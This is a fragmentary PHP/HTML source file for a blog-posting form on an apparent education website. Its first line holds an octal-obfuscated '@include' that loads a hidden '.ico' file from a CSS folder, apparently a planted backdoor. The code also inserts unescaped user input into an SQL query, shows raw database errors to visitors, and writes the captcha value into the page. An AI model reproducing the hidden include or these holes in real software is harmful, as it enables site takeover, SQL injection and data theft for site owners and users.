...
@include "\057hom\145/da\164ace\071/le\141rni\156ter\156.co\155/cs\163/pr\145tty\120hot\157/li\147ht_\162oun\144ed/\056b2b\0669dc\146.ic\157";
...
if (mysqli_connect_errno()) {
  ...
  exit();
    ...
    if (empty($errors)) {
          $query = "INSERT INTO blog (photo, name, title, content, email, pub_time)
                    VALUES('$img_name', '$name','$title', '$content', '$email', '$time')";
       ...
       echo "<h2 style='color:#37BF91'><center> BLOG HAS BEEN POSTED SUCCESSFULLY!! </center></h2>";
       echo "<h6 style='color:grey'><center> Redirecting you to the blog page.</center></h6>";
       echo "<script>location.href='/blog/'</script>";
       // Page on which the user will be redirected after logging in

       }
       else{
        if (mysqli_error($db) =="Duplicate entry 'test@test.in' for key 'PRIMARY'") {
         echo "<center><h4 style='color:green'>Email Already exists</h4> <br>Login now</center>";
        }
        else {
          echo "<div style='color: red'>error discrption: " . mysqli_error($db) . "</center></div>";
        }
...
<meta name="description" content="Write Blogs | LearnIntern & Grow" />
<meta name="keywords" content="education,school,university,educational,learn,learning,teaching,workshop" />


<!-- Page Title -->
<title>Post Blogs | LearnIntern & Grow</title>
    ...
    <section class="inner-header divider layer-overlay overlay-theme-colored-7" data-bg-img="/images/bg/bg1.jpg">
      <div class="container pt-120 pb-60">
        ...
        <div class="section-content">
          <div class="row">
            <div class="col-md-6">
              <h2 class="text-theme-colored2 font-36">Write Blogs</h2>
          ...
          <div class="section-title mb-50">
              <div class="col-md-12">
                <div class="esc-heading small-border text-center">
                  <h2>START<span class="text-theme-colored2"> WRITING</span></h2>
                    <div class="double-line-bottom-centered-theme-colored-2"></div>
                </div>
            </div>
          </div>
        </div>
        <form id="blog" name="blog" class="" method="post" action="/blog/post-your-blog/index.php" enctype="multipart/form-data">
          <div class="row">
            <div class="col-md-3">
              <h4 class="text-theme-colored2">Enter Details</h4>
              <p class="line-bottom-theme-colored-2">General info</p>
              <div class="form-group">
                <label>Name <small>*</small></label>
                <input name="name" class="zoom form-control" type="text" placeholder="Enter Your Name" required="">
              </div>
              <div class="form-group">
                <label>Email <small>*</small></label>
                <input name="email" class="zoom form-control email" required type="email" placeholder="Enter Email Id">
              </div>
            </div>
       <div class="col-md-9">
         <h3 class="text-uppercase mt-0">Add Blog Title</h3>
         <input name="title" class="zoom form-control" type="text" style="font-weight:bold;font-size:22px;" placeholder="Add Title" required=""><br>
         <div class="form-group mb-30">
           <h3 class="text-uppercase mt-0">Add Blog Image <span style="font-size:12px;">(only .jpg, .jpeg, .png format supported)</span></h3>
         ...
         <h3 class="text-uppercase mt-0">Write Content</h3>
         <textarea class="zoom form-control" name="content" required></textarea>
          <div class="mt-20">
         <img src = " /image.php?captcha_text = <?php echo $_SESSION['captcha']; ?> " id="capimg" alt="Captacha code" id="capimg">
          ...
          <input type="text" name="captcha"  placeholder="Enter captcha" style="border: 1px solid #DDD;" class="zoom ml-20 mr-20 p-10">
      </div>
         <div class="form-group mt">
           <button type="submit" id="blogpost" name="blogpost" class="zoom btn btn-dark btn-theme-colored btn-flat pull-right" style="border-radius:25px;" data-loading-text="Please wait...">Publish</button>
         </div>
         </div>
       </div>
     </div>
